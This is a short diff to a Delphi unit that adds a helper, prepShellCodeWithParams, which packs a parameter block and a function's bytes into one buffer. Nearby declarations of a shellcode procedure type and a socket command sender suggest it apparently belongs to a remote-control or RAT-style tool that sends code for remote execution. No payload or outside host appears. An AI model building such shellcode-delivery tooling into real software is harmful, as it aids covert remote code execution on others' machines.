@@ -32,7 +32,29 @@ type
   TShellCodeFunc = procedure (ptrData:Pointer; dwLen:Integer; ptrAPIBlock:PAPIBlock); stdcall;
   PShellCodeFunc = ^TShellCodeFunc;
 function SendBuffer(hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
+function prepShellCodeWithParams(pFunc, pParam:Pointer; dwFunc, dwParam:Cardinal; var buffLen:Cardinal):Pointer;
 implementation
+
+function prepShellCodeWithParams(pFunc, pParam:Pointer; dwFunc, dwParam:Cardinal; var buffLen:Cardinal):Pointer;
+var
+  dwFullLen:Cardinal;
+  pResult:Pointer;
+begin
+  buffLen := dwFunc + dwParam + 4;
+  Result := GetMemory(buffLen);
+  if Result <> nil then
+  begin
+    pResult := Result;
+    CopyMemory(pResult, @dwParam,4);
+    Inc(PByte(pResult), 4);
+    if dwParam > 0 then
+    begin
+      CopyMemory(pResult, pParam, dwParam);
+      inc(PByte(pResult), dwParam);
+    end;
+    CopyMemory(pResult, pFunc, dwFunc);
+  end;
+end;
 
 function SendBuffer(hSocket: Integer; bySocketCmd: Byte; lpszBuffer: PWideChar; iBufferLen: Integer): Boolean;
 var
